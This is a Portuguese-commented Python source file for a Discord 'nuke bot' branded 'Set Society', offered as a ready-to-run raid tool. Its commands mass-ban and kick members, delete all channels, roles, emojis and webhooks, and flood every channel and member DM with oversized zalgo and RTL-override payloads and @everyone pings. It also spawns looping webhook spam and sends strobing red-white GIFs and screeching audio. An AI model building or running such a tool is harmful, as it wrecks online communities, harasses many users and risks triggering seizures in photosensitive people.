#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
DISCORD NUKE BOT — v2.0 OP EDITION
- Payload máximo de caracteres bizarros (zalgo, cuneiforme, RTL, variação,
  zero-width, matemático, circled...) até o limite de 2000 chars do Discord.
- Marca @everyone / @here dentro do spam (cada mensagem estoura notificações).
- Blocos "Set Society" intercalados no meio do flood.
- Modo OP: flooda TODOS os canais do servidor simultaneamente com payload max.
- Mantém: spam, ghostping, nukedm, raid, nuke, banall, kickall, mediawave, fill...
"""

import asyncio
import io
import math
import os
import random
import struct
import sys
import time
import zlib

import discord
from discord.ext import commands

# ============================ CONFIG ============================
PREFIX = "!"
def _load_token() -> str:
    """Prioridade: env DISCORD_TOKEN > arquivo token.txt (sem passar pelo chat)."""
    env = os.getenv("DISCORD_TOKEN", "").strip()
    if env:
        return env
    try:
        with open(os.path.join(os.path.dirname(__file__), "token.txt"), "r",
                  encoding="utf-8") as f:
            tok = f.read().strip()
        if tok:
            return tok
    except OSError:
        pass
    return ""

TOKEN = _load_token()
MAX_MSG = 2000  # limite do Discord por mensagem
MEDIA_SIZE = 10 * 1024 * 1024

# ============================ INTENTS ============================
intents = discord.Intents.all()
intents.message_content = True
intents.presences = False

bot = commands.Bot(command_prefix=PREFIX, intents=intents, help_command=None)

# ============================ PAYLOAD BIZARRO ============================

# Combinação de diacríticos zalgo (pilhas de acentos em cima/baixo)
ZALGO_TOP = "".join(chr(c) for c in range(0x0300, 0x036F))
ZALGO_BOT = "\u0316\u0317\u0318\u0319\u031A\u031B\u031C\u031D\u031E\u031F" \
            "\u0320\u0321\u0322\u0323\u0324\u0325\u0326\u0327\u0328\u0329" \
            "\u032A\u032B\u032C\u032D\u032E\u032F\u0330\u0331\u0332\u0333\u0334\u0335"
ZALGO_MID = "\u0335\u0336\u0337\u0338"

# Caracteres "de crash" / renderização pesada
WEIRD = [
    "\u1242B",  # 𒐫 cuneiforme
    "\u202E",   # RIGHT-TO-LEFT OVERRIDE (inverte direção do render)
    "\u200B",   # zero-width space
    "\u200D",   # zero-width joiner
    "\uFE0F",   # variation selector-16 (emojis)
    "\uFE0E",   # variation selector-15
    "\u180E",   # mongolian vowel separator
    "\u3164",   # hangul filler
    "\uFFA0",   # halfwidth hangul filler
    "\u061C",   # arabic letter mark
    "\u2066\u2069",  # isolate / pop directional
    "\uFFFD",   # replacement char
    "\u0000\uFFF9\uFFFA\uFFFB",  # interlinear annotation
    "\uE0000\uE007F",  # tags block
    "\u10FFFF",   # último codepoint unicode
    "\uD7FF\uE000",  # bordas de private use (surrogates display)
    "\u1F600",  # emoji base
    "\u2591\u2592\u2593\u2588",  # blocos
    "\u2620\u2623\u2639\u2764",  # caveira, biohazard, etc
    "\u26A0\u26A1\u2694\u269B",  # sinais pesados
]

def zalgo_text(n: int = 8) -> str:
    """Gera um bloco de caracteres-base espessados com pilhas de diacríticos."""
    base = random.choice(["A", "S", "E", "T", "N", "H", "O", "X", "M"])
    out = base
    for _ in range(n):
        out += random.choice(ZALGO_TOP) + random.choice(ZALGO_BOT)
        if random.random() < 0.4:
            out += random.choice(ZALGO_MID)
    return out

def cunei_text(n_blocos: int = 12, min_rep: int = 8, max_rep: int = 22) -> str:
    """Gera textão cuneiforme: blocos de 𒐫 separados por espaços."""
    return " ".join("\u1242B" * random.randint(min_rep, max_rep)
                    for _ in range(n_blocos))

def build_nuke_payload() -> str:
    """
    Monta UMA mensagem de ~1990-2000 chars com:
      - CUNEIFORME 𒐫 em massa (dominante)
      - zalgo mutante, caracteres bizarros, RTL override
      - @everyone e @here espalhados
      - bloco "Set Society" no meio
    Retorna string pronta pro ctx.send.
    """
    parts = []
    current_len = 0
    target = MAX_MSG - 10  # folga de segurança
    while current_len < target:
        r = random.random()
        if r < 0.35:
            seg = "@everyone @everyone @everyone"  # notificação em massa
        elif r < 0.55:
            seg = "@here @here @here"              # notificação online
        elif r < 0.78:
            seg = cunei_text(random.randint(5, 12))  # 𒐫 dominante
        elif r < 0.88:
            seg = "\u202E" + zalgo_text(random.randint(5, 12)) + "\u202C"
        elif r < 0.95:
            seg = f"**Set Society** {cunei_text(3)}"
        else:
            seg = "".join(random.choice(WEIRD) * random.randint(1, 4) for _ in range(random.randint(3, 8)))
        if current_len + len(seg) > target:
            seg = seg[: target - current_len]
        parts.append(seg)
        current_len += len(seg)
    # garante que "Set Society" apareça pelo menos uma vez
    if "Set Society" not in "".join(parts):
        parts.insert(random.randint(0, len(parts)), "**Set Society** 𒐫" * 3)
        while len("".join(parts)) > MAX_MSG - 2:
            parts.pop()
    return "".join(parts)

def progress_max(vezes: int) -> list:
    """Retorna lista de payloads máximos (1 por iteração)."""
    return [build_nuke_payload() for _ in range(max(1, vezes))]

# ============================ MÍDIA PERTURBADORA ============================

def make_strobe_png(w: int = 256, h: int = 256) -> bytes:
    rows = []
    for y in range(h):
        row = bytearray([0])
        for x in range(w):
            band = (x // 32) % 2
            if (y // 32) % 2 == band:
                row += b"\xff\x00\x00"
            else:
                row += b"\xff\xff\xff"
        rows.append(bytes(row))
    raw = b"".join(rows)
    idat = zlib.compress(raw, 9)
    def chunk(tag: bytes, data: bytes) -> bytes:
        c = struct.pack(">I", len(data)) + tag + data
        return c + struct.pack(">I", zlib.crc32(tag + data) & 0xFFFFFFFF)
    ihdr = struct.pack(">IIBBBBB", w, h, 8, 2, 0, 0, 0)
    out = b"\x89PNG\r\n\x1a\n"
    out += chunk(b"IHDR", ihdr) + chunk(b"IDAT", idat) + chunk(b"IEND", b"")
    return out

def make_screech_wav(duration: float = 2.0, freq: float = 3000.0) -> bytes:
    sr = 44100
    n = int(sr * duration)
    buf = io.BytesIO()
    buf.write(b"RIFF")
    data_size = n * 2
    buf.write(struct.pack("<I", 36 + data_size))
    buf.write(b"WAVEfmt ")
    buf.write(struct.pack("<IHHIIHH", 16, 1, 1, sr, sr * 2, 2, 16))
    buf.write(b"data")
    buf.write(struct.pack("<I", data_size))
    for i in range(n):
        t = i / sr
        s = (math.sin(2 * math.pi * freq * t)
             + 0.6 * math.sin(2 * math.pi * freq * 1.5 * t)
             + 0.4 * math.sin(2 * math.pi * 1950 * t))
        s *= 0.8 + 0.5 * math.sin(2 * math.pi * 9 * t)
        buf.write(struct.pack("<h", max(-32767, min(32767, int(s * 12000)))))
    return buf.getvalue()

def make_strobe_gif(w: int = 320, h: int = 320, frames: int = 10) -> bytes:
    """GIF animado piscando: alterna vermelho/branco com 'SET SOCIETY'."""
    try:
        from PIL import Image, ImageDraw, ImageFont
    except ImportError:
        return make_strobe_png(w, h)  # fallback se Pillow ausente
    imgs = []
    for i in range(frames):
        img = Image.new("RGB", (w, h), (255, 0, 0) if i % 2 == 0 else (255, 255, 255))
        d = ImageDraw.Draw(img)
        for bx in range(0, w, 64):
            d.rectangle([bx, 0, bx + 32 if (bx // 64) % 2 == i % 2 else bx + 31, h],
                        fill=(255, 255, 255) if i % 2 == 0 else (255, 0, 0))
        try:
            fnt = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 46)
        except Exception:
            fnt = ImageFont.load_default()
        d.text((w // 2 - 130, h // 2 - 25), "SET SOCIETY", fill=(0, 0, 0), font=fnt)
        imgs.append(img)
    buf = io.BytesIO()
    imgs[0].save(buf, format="GIF", save_all=True, append_images=imgs[1:],
                 duration=80, loop=0, optimize=False)
    return buf.getvalue()

STROBE_PNG = make_strobe_png()
STROBE_GIF = make_strobe_gif()
SCREECH_WAV = make_screech_wav()
MEDIA_FILENAMES = [
    "𒐫-𒐫-𒐫.png", "𒐫𒐫𒐫𒐫.png", "𒐫-1.png",
    "𒐫-𒐫-𒐫-𒐫.png", "𒐫-𒐫𒐫-.png",
    "𒐫-𒐫.wav", "𒐫𒐫𒐫.wav", "𒐫-𒐫-𒐫.wav", "𒐫-𒐫𒐫𒐫.wav",
]

# ============================ EVENTOS ============================

@bot.event
async def on_ready():
    print(f"[+] Logado como {bot.user} (ID: {bot.user.id})")
    print(f"[+] Prefixo: {PREFIX} | Slash: / | Guilds: {len(bot.guilds)}")
    try:
        synced = await bot.tree.sync()
        print(f"[+] Comandos slash sincronizados: {len(synced)}")
    except Exception as e:
        print(f"[!] Falha no sync de slash: {e}")

@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.CommandNotFound):
        return
    try:
        await ctx.send(f"```{error}```", delete_after=3)
    except Exception:
        pass

# ============================ COMANDOS OP ============================

# ---------- SPAM MÁXIMO (payload de 2000 chars) ----------
@bot.hybrid_command(name="spam", aliases=["flood", "max"],
                    description="Spamma mensagens de ~2000 chars bizarras com @everyone/@here")
async def spam(ctx, vezes: int = 10):
    vezes = max(1, min(vezes, 100))
    for i in range(vezes):
        try:
            await ctx.send(build_nuke_payload())
        except Exception:
            pass
        await asyncio.sleep(0.05)

@bot.hybrid_command(name="op", aliases=["rage", "super"],
                    description="MODO OP: flooda TODOS os canais com payload máximo")
async def op(ctx, vezes_por_canal: int = 5):
    """OP: abre um flood task por canal do servidor, todos ao mesmo tempo."""
    if ctx.guild is None:
        await ctx.send("✖ Use em um servidor", delete_after=3)
        return
    canais = [c for c in ctx.guild.text_channels
              if c.permissions_for(ctx.me).send_messages]
    if not canais:
        await ctx.send("✖ Sem canais com permissão", delete_after=3)
        return
    vezes_por_canal = max(1, min(vezes_por_canal, 20))

    async def flood_channel(ch):
        for _ in range(vezes_por_canal):
            try:
                await ch.send(build_nuke_payload())
            except Exception:
                return
            await asyncio.sleep(0.03)

    await asyncio.gather(*[flood_channel(c) for c in canais])
    try:
        await ctx.send(f"✔ OP em {len(canais)} canais × {vezes_por_canal} msgs", delete_after=3)
    except Exception:
        pass

@bot.hybrid_command(name="opdm", aliases=["opall"],
                    description="OP também nas DMs de todos os membros do servidor")
async def opdm(ctx, vezes: int = 5):
    if ctx.guild is None:
        await ctx.send("✖ Use em um servidor", delete_after=3)
        return
    ok = 0
    for m in ctx.guild.members:
        if m.bot:
            continue
        try:
            dm = await m.create_dm()
            for _ in range(max(1, vezes)):
                await dm.send(build_nuke_payload())
                await asyncio.sleep(0.02)
            ok += 1
        except Exception:
            pass
    await ctx.send(f"✔ DMs OP: {ok} membros", delete_after=3)

# ---------- SPAM PERSONALIZADO ----------
@bot.hybrid_command(name="spamcustom", description="Spam de texto personalizado")
async def spamcustom(ctx, vezes: int = 10, *, texto: str = "𒐫"):
    vezes = max(1, min(vezes, 50))
    for _ in range(vezes):
        await ctx.send(texto)
        await asyncio.sleep(0.1)

# ---------- GHOST PING ----------
@bot.hybrid_command(name="ghostping", aliases=["gp"],
                    description="Menciona todo mundo e apaga a mensagem")
async def ghostping(ctx):
    msg = await ctx.send("@everyone 🗿")
    await asyncio.sleep(0.3)
    try:
        await msg.delete()
    except Exception:
        pass
    try:
        await ctx.message.delete()
    except Exception:
        pass

@bot.hybrid_command(name="ghostpinguser", description="Ghost ping num user específico")
async def ghostpinguser(ctx, membro: discord.User):
    msg = await ctx.send(membro.mention)
    await asyncio.sleep(0.3)
    try:
        await msg.delete()
    except Exception:
        pass
    try:
        await ctx.message.delete()
    except Exception:
        pass

# ---------- NUKE DM ----------
@bot.hybrid_command(name="nukedm", aliases=["dmspam", "dmflood"],
                    description="Spamma DM de um membro com payload máximo")
async def nukedm(ctx, membro: discord.User, vezes: int = 10):
    vezes = max(1, min(vezes, 50))
    try:
        dm = await membro.create_dm()
        for _ in range(vezes):
            await dm.send(build_nuke_payload())
            await asyncio.sleep(0.15)
        await ctx.send(f"✔ DM spam em {membro} concluído", delete_after=3)
    except discord.Forbidden:
        await ctx.send("✖ DM fechada ou bot bloqueado", delete_after=3)
    except Exception as e:
        await ctx.send(f"✖ {e}", delete_after=3)

@bot.hybrid_command(name="dmall", description="Manda DM de spam pra todos do servidor")
async def dmall(ctx, vezes: int = 5):
    if ctx.guild is None:
        await ctx.send("✖ Use em um servidor", delete_after=3)
        return
    ok = falha = 0
    for m in ctx.guild.members:
        if m.bot:
            continue
        try:
            dm = await m.create_dm()
            await dm.send(build_nuke_payload())
            ok += 1
        except Exception:
            falha += 1
        await asyncio.sleep(0.2)
    await ctx.send(f"✔ DM enviadas: {ok} | falhas: {falha}", delete_after=3)

# ---------- RAID ----------
@bot.hybrid_command(name="raid", aliases=["floodch"],
                    description="Cria N canais de spam e flooda todos com payload máximo")
async def raid(ctx, canais: int = 10, msgs: int = 5):
    if ctx.guild is None:
        await ctx.send("✖ Use em um servidor", delete_after=3)
        return
    canais = max(1, min(canais, 128))
    msgs = max(1, min(msgs, 10))
    created = []
    for i in range(canais):
        try:
            ch = await ctx.guild.create_text_channel(f"nuked-{i}")
            created.append(ch)
        except Exception:
            pass
        await asyncio.sleep(0.1)
    for ch in created:
        try:
            for _ in range(msgs):
                await ch.send(build_nuke_payload())
                await asyncio.sleep(0.05)
        except Exception:
            pass
    await ctx.send(f"✔ Raid: {len(created)} canais, {msgs} msgs cada", delete_after=3)

@bot.hybrid_command(name="threadspam", aliases=["threads"],
                    description="Cria threads spam em todos os canais de texto")
async def threadspam(ctx, por_canal: int = 5):
    if ctx.guild is None:
        await ctx.send("✖ Use em um servidor", delete_after=3)
        return
    por_canal = max(1, min(por_canal, 20))
    total = 0
    for ch in ctx.guild.text_channels:
        try:
            for i in range(por_canal):
                t = await ch.create_thread(name=f"𒐫-{i}", message=None)
                await t.send(build_nuke_payload())
                total += 1
        except Exception:
            pass
    await ctx.send(f"✔ {total} threads criadas", delete_after=3)

# ---------- NUKE APOCALIPSE ----------
@bot.hybrid_command(name="nuke", aliases=["n", "apocalipse"],
                    description="APOCALIPSE: limpa tudo, cria 100+ cargos/canais, webhooks spam e GIF piscando")
async def nuke(ctx, cargos: int = 140, canais: int = 80, wh_por_canal: int = 10):
    """Devasta o servidor:
      1) apaga webhooks, emojis, roles, canais e bane todos
      2) cria N cargos com nomes zalgo
      3) cria N canais de texto
      4) cria até 10 webhooks por canal (limite do Discord)
      5) cada webhook spamma payload 2000 chars com @everyone em loop
      6) GIF estroboscópico piscando nos canais
    """
    if ctx.guild is None:
        await ctx.send("✖ Use em um servidor", delete_after=3)
        return
    g = ctx.guild
    cargos = max(1, min(cargos, 250))
    canais = max(1, min(canais, 150))
    wh_por_canal = max(1, min(wh_por_canal, 10))
    await ctx.send(cunei_text(20), delete_after=30)
    if ctx.guild.me.guild_permissions.administrator is False:
        pass  # tenta mesmo sem admin, ignora erros

    # mensagem de progresso editável (não polui o chat)
    try:
        prog = await ctx.send("```𒐫 iniciando apocalipse...```")
    except Exception:
        prog = None

    async def _prog(texto: str):
        if prog:
            try:
                await prog.edit(content=f"```{texto}```")
            except Exception:
                pass

    async def _safe(coro, espera=1.0):
        """Executa coro com retry em rate limit 429.
        Retorna (sucesso_bool, resultado_ou_erro_str)."""
        while True:
            try:
                return True, await coro
            except discord.HTTPException as e:
                if e.status == 429:
                    await asyncio.sleep(espera)
                else:
                    return False, f"HTTP {e.status} {e.text[:120]}"
            except Exception as e:
                return False, f"{type(e).__name__}: {str(e)[:120]}"

    async def _del(coro, espera=0.3):
        """Deleta e conta — `delete()` retorna None em sucesso, então
        contamos via try, não via retorno."""
        ok, res = await _safe(coro, espera)
        return ok

    # ---------- DIAGNÓSTICO DE PERMISSÃO (visível) ----------
    perms = ctx.me.guild_permissions
    falta = []
    if not perms.administrator:
        for nome, p in (("gerenciar_canais", perms.manage_channels),
                        ("gerenciar_cargos", perms.manage_roles),
                        ("gerenciar_webhooks", perms.manage_webhooks),
                        ("banir", perms.ban_members),
                        ("mencionar_todos", perms.mention_everyone)):
            if not p:
                falta.append(nome)
        await _prog(f"⚠ SEM ADMIN. faltando: {', '.join(falta)}\n"
                    f"limpeza vai falhar onde não tiver perm!")
    else:
        await _prog("✅ admin ok — destruindo...")

    # ---------- 1) LIMPEZA TOTAL (com contagem real) ----------
    n_wh = n_emo = n_rol = n_cha = 0
    erros = []

    await _prog("limpeza: webhooks...")
    ok, whs = await _safe(g.webhooks(), 0.5)
    for w in whs or []:
        if await _del(w.delete()):
            n_wh += 1
    await _prog(f"limpeza: emojis... ({n_wh} wh apagados)")
    for e in list(g.emojis):
        if await _del(e.delete()):
            n_emo += 1
    bot_top = ctx.me.top_role
    await _prog(f"limpeza: cargos... ({n_emo} emojis apagados)")
    for r in list(g.roles):
        if r.is_default() or r.managed or r >= bot_top:
            continue
        if await _del(r.delete()):
            n_rol += 1
    await _prog(f"limpeza: canais... ({n_rol} cargos apagados)")
    for ch in list(g.channels):
        if await _del(ch.delete()):
            n_cha += 1
    await _prog(f"limpeza feita: {n_wh}wh {n_emo}emoji {n_rol}cargos {n_cha}canais")

    # bans rodam em BACKGROUND (não bloqueiam a criação)
    async def ban_todos():
        for m in list(g.members):
            if m.id == g.owner_id or m == ctx.me:
                continue
            await _safe(m.ban(reason="apocalipse"), 0.2)
    ban_task = asyncio.create_task(ban_todos())

    # ---------- SPAM DO BOT — começa no PRIMEIRO canal criado ----------
    # (é ele que marca @everyone/@here REAL; webhooks não mencionam)
    stop_spam = asyncio.Event()

    async def spam_bot():
        rng = random.Random()
        idx = 0
        while not stop_spam.is_set():
            ch = canais_criados[idx % len(canais_criados)] if canais_criados else None
            if ch is None:
                await asyncio.sleep(0.2)
                continue
            try:
                await ch.send(
                    build_nuke_payload(),
                    allowed_mentions=discord.AllowedMentions(
                        everyone=True, here=True, users=False, roles=False))
                # GIF piscando a cada ~5 msgs
                if rng.random() < 0.2:
                    await ch.send(
                        cunei_text(20),
                        file=discord.File(io.BytesIO(STROBE_GIF), filename="strobe.gif"),
                        allowed_mentions=discord.AllowedMentions(
                            everyone=True, here=True, users=False, roles=False))
            except Exception:
                pass
            idx += 1
            await asyncio.sleep(0.35 + rng.random() * 0.4)  # RÁPIDO: ~2 msg/s/canal

    tasks = []

    # ---------- 3) CANAIS RÁPIDOS + spam já rolando ----------
    canais_criados = []
    for i in range(canais):
        ch_name = random.choice([
            "𒐫𒐫𒐫", "𒐫-nuked", "𒐫-set-society", "𒐫-jax",
            "𒐫-wrecked", "𒐫-gg"]) + f"-{i}"
        ok, ch = await _safe(g.create_text_channel(name=ch_name), 0.4)
        if ok and ch:
            canais_criados.append(ch)
            if len(canais_criados) == 1:
                # primeiro canal → liga o spam do bot na hora
                tasks.append(asyncio.create_task(spam_bot()))
        else:
            erros.append(f"canal {i}: {ch}")
        if i % 15 == 0:
            await _prog(f"canais: {len(canais_criados)}/{canais} | spam: ON ({len(tasks)})")
        await asyncio.sleep(0.25)  # ~4 canais/s

    # ---------- 4) WEBHOOKS RÁPIDOS (10/canal) — já spammam ----------
    await _prog(f"webhooks: {len(canais_criados)} canais...")
    webhooks = []
    wh_idx = 0

    async def spam_webhook(wh, wi):
        rng = random.Random()
        while not stop_spam.is_set():
            await _safe(wh.send(content=build_nuke_payload(),
                                username=f"𒐫 Set Society {wi}"), 0.8)
            if rng.random() < 0.2:
                await _safe(wh.send(
                    content=cunei_text(20),
                    file=discord.File(io.BytesIO(STROBE_GIF), filename="strobe.gif"),
                    username=f"𒐫 Set Society {wi}"), 0.8)
            try:
                await asyncio.sleep(0.4 + rng.random() * 0.5)
            except Exception:
                break

    for ch in canais_criados:
        for w in range(wh_por_canal):
            ok, wh = await _safe(ch.create_webhook(
                name=f"𒐫 Set Society {w}",
                avatar=io.BytesIO(STROBE_PNG)), 0.4)
            if ok and wh:
                webhooks.append(wh)
                tasks.append(asyncio.create_task(spam_webhook(wh, wh_idx)))
                wh_idx += 1
            else:
                break  # canal cheio/rate limit alto → passa pro próximo
        await asyncio.sleep(0.15)  # criação rápida de webhooks

    # ---------- 2) CARGOS CUNEIFORME EM BACKGROUND (rate limit ~1/s) ----------
    async def cria_cargos():
        n = 0
        for i in range(cargos):
            nome = f"𒐫 {cunei_text(4)} Set Society {zalgo_text(8)}"
            ok, r = await _safe(g.create_role(name=nome[:100], hoist=(i % 7 == 0)), 1.2)
            if ok and r:
                n += 1
            await asyncio.sleep(0.9)
        return n
    cargos_task = asyncio.create_task(cria_cargos())

    # canal base com GIF
    try:
        base = canais_criados[0] if canais_criados else await g.create_text_channel("𒐫")
        if base:
            await _safe(base.send(cunei_text(20),
                                  file=discord.File(io.BytesIO(STROBE_GIF), filename="strobe.gif")), 1.0)
    except Exception:
        pass

    # aguarda uns segundos pra cargos avançarem e reporta
    await asyncio.sleep(3)
    n_cargos = cargos_task.result() if cargos_task.done() else "..."

    rel_erros = (" | erros: " + "; ".join(erros[:5])) if erros else ""
    await ctx.send(
        cunei_text(10) + f"\n{n_cargos} cargos | {len(canais_criados)} canais | "
        f"{len(webhooks)} webhooks + bot spammando com @everyone REAL | "
        f"limpou: {n_wh}wh {n_emo}emoji {n_rol}cargos {n_cha}canais{rel_erros}",
        delete_after=30)

    # mantém o processo vivo (tasks em background não bloqueiam o bot)
    # NOTA: tasks continuam rodando até erro/bot reiniciar (cron 5h)

@bot.hybrid_command(name="banall", description="Bane todos os membros do servidor")
async def banall(ctx):
    if ctx.guild is None:
        await ctx.send("✖ Use em um servidor", delete_after=3)
        return
    g = ctx.guild
    ok = falha = 0
    for m in list(g.members):
        if m.id == g.owner_id or m == ctx.me or m.bot:
            continue
        try:
            await m.ban(reason="banall")
            ok += 1
        except Exception:
            falha += 1
        await asyncio.sleep(0.02)
    await ctx.send(f"✔ Banidos: {ok} | falhas: {falha}", delete_after=3)

@bot.hybrid_command(name="kickall", description="Expulsa todos os membros do servidor")
async def kickall(ctx):
    if ctx.guild is None:
        await ctx.send("✖ Use em um servidor", delete_after=3)
        return
    g = ctx.guild
    ok = falha = 0
    for m in list(g.members):
        if m.id == g.owner_id or m == ctx.me or m.bot:
            continue
        try:
            await m.kick(reason="kickall")
            ok += 1
        except Exception:
            falha += 1
        await asyncio.sleep(0.02)
    await ctx.send(f"✔ Kickados: {ok} | falhas: {falha}", delete_after=3)

@bot.hybrid_command(name="deleteroles", aliases=["rolekill"],
                    description="Apaga todos os cargos do servidor")
async def deleteroles(ctx):
    if ctx.guild is None:
        await ctx.send("✖ Use em um servidor", delete_after=3)
        return
    bot_top = ctx.me.top_role
    ok = 0
    for r in list(ctx.guild.roles):
        try:
            if r.is_default() or r.managed or r >= bot_top:
                continue
            await r.delete()
            ok += 1
        except Exception:
            pass
    await ctx.send(f"✔ Roles apagados: {ok}", delete_after=3)

@bot.hybrid_command(name="deleteemojis", description="Apaga todos os emojis do servidor")
async def deleteemojis(ctx):
    if ctx.guild is None:
        await ctx.send("✖ Use em um servidor", delete_after=3)
        return
    ok = 0
    for e in list(ctx.guild.emojis):
        try:
            await e.delete()
            ok += 1
        except Exception:
            pass
    await ctx.send(f"✔ Emojis apagados: {ok}", delete_after=3)

@bot.hybrid_command(name="rename", description="Renomeia o servidor")
async def rename(ctx, *, nome: str):
    if ctx.guild is None:
        await ctx.send("✖ Use em um servidor", delete_after=3)
        return
    try:
        await ctx.guild.edit(name=nome)
        await ctx.send(f"✔ Servidor renomeado pra '{nome}'", delete_after=3)
    except Exception as e:
        await ctx.send(f"✖ {e}", delete_after=3)

@bot.hybrid_command(name="webhookspam", aliases=["wh"],
                    description="Cria webhook e spamma o canal via webhook")
async def webhookspam(ctx, vezes: int = 10):
    if ctx.guild is None or not isinstance(ctx.channel, discord.TextChannel):
        await ctx.send("✖ Use num canal de texto", delete_after=3)
        return
    vezes = max(1, min(vezes, 30))
    try:
        wh = await ctx.channel.create_webhook(name="𒐫")
        for _ in range(vezes):
            await wh.send(build_nuke_payload(), username="Set Society")
            await asyncio.sleep(0.1)
        await wh.delete()
    except Exception as e:
        await ctx.send(f"✖ {e}", delete_after=3)

# ---------- MÍDIA PERTURBADORA ----------
@bot.hybrid_command(name="media", aliases=["m"],
                    description="Manda imagem estroboscópica + som estridente")
async def media(ctx):
    f_png = discord.File(io.BytesIO(STROBE_PNG), filename="jumpscare_frame.png")
    f_wav = discord.File(io.BytesIO(SCREECH_WAV), filename="𒐫-𒐫-𒐫-𒐫.wav")
    try:
        await ctx.send("Set Society", files=[f_png, f_wav])
    except Exception as e:
        await ctx.send(f"✖ {e}", delete_after=3)

@bot.hybrid_command(name="mediawave", aliases=["mw"],
                    description="Envia onda de mídia perturbadora (padrão 10)")
async def mediawave(ctx, vezes: int = 10):
    vezes = max(1, min(vezes, 40))
    for i in range(vezes):
        try:
            png = discord.File(io.BytesIO(STROBE_PNG),
                               filename=random.choice(MEDIA_FILENAMES))
            await ctx.send(cunei_text(3), file=png)
            await asyncio.sleep(0.2)
            wav = discord.File(io.BytesIO(SCREECH_WAV),
                               filename=random.choice(MEDIA_FILENAMES))
            await ctx.send(cunei_text(3), file=wav)
            await asyncio.sleep(0.2)
        except Exception:
            break

@bot.hybrid_command(name="fill", aliases=["fillchannel", "lag"],
                    description="Inunda o canal com arquivos pesados até travar")
async def fill(ctx, arquivos: int = 20):
    arquivos = max(1, min(arquivos, 100))
    blob = b"\x00\xff\x10\x01" * (MEDIA_SIZE // 4)
    for i in range(arquivos):
        f = discord.File(io.BytesIO(blob), filename=f"index{i}.mp4")
        try:
            await ctx.send("‼ Set Society", file=f)
        except Exception:
            break
        await asyncio.sleep(0.05)
    await ctx.send("✔ Flood de arquivos concluído", delete_after=3)

@bot.hybrid_command(name="audio", description="Manda o som estridente")
async def audio(ctx):
    f = discord.File(io.BytesIO(SCREECH_WAV), filename="𒐫-𒐫-𒐫.wav")
    await ctx.send(cunei_text(3), file=f)

@bot.hybrid_command(name="image", description="Manda a imagem estroboscópica")
async def image(ctx):
    f = discord.File(io.BytesIO(STROBE_PNG), filename="𒐫-𒐫.png")
    await ctx.send(cunei_text(3), file=f)

# ---------- INFO ----------
@bot.hybrid_command(name="help", aliases=["ajuda", "cmds"],
                    description="Lista todos os comandos")
async def helpcmd(ctx):
    cmds = [
        "spam [vezes] — payload 2000 chars bizarro + @everyone/@here + Set Society",
        "op [msgs] — flood em TODOS os canais simultaneamente",
        "opdm [vezes] — flood payload máximo nas DMs de todos",
        "spamcustom [vezes] [texto] — flood personalizado",
        "ghostping / ghostpinguser [user] — ping e apaga",
        "nukedm [user] [vezes] — flood na DM de alguém",
        "dmall [vezes] — flood na DM de todos do servidor",
        "raid [canais] [msgs] — cria canais e flooda",
        "threadspam [por_canal] — cria threads spam",
        "nuke [cargos] [canais] [wh] — APOCALIPSE: limpa tudo, 100+ cargos/canais, webhooks spam, GIF",
        "banall / kickall — bane/expulsa todo mundo",
        "deleteroles / deleteemojis — limpa cargos/emojis",
        "rename [nome] — renomeia o servidor",
        "webhookspam [vezes] — spam via webhook (usuario Set Society)",
        "media — imagem estroboscópica + som estridente",
        "mediawave [vezes] — onda de mídia perturbadora",
        "fill [n] — arquivos de 10MB até travar o client",
        "audio / image — manda o som/imagem isolados",
    ]
    try:
        await ctx.send("```" + "\n".join(cmds) + "```")
    except Exception:
        await ctx.send("\n".join(cmds))

# ============================ MAIN ============================

if __name__ == "__main__":
    bot.run(TOKEN)